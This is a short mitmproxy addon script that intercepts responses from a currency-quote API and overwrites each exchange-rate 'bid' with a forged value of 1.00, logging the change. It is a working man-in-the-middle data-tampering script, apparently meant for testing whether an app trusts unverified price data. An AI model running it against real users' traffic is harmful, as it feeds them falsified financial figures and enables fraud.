import json

from mitmproxy import http

TARGET_HOST = "economia.awesomeapi.com.br"
FAKE_BID = "1.00"


def response(flow: http.HTTPFlow) -> None:
    if TARGET_HOST not in flow.request.pretty_host:
        return
    if flow.response is None:
        return

    try:
        data = json.loads(flow.response.get_text())
    except ValueError:
        return

    changed = False
    for entry in data.values():
        if isinstance(entry, dict) and "bid" in entry:
            original = entry["bid"]
            entry["bid"] = FAKE_BID
            changed = True
            print(
                f"[tamper_quote] {flow.request.pretty_url}: "
                f"real bid={original!r} -> forged={FAKE_BID!r}"
            )

    if changed:
        flow.response.set_text(json.dumps(data))
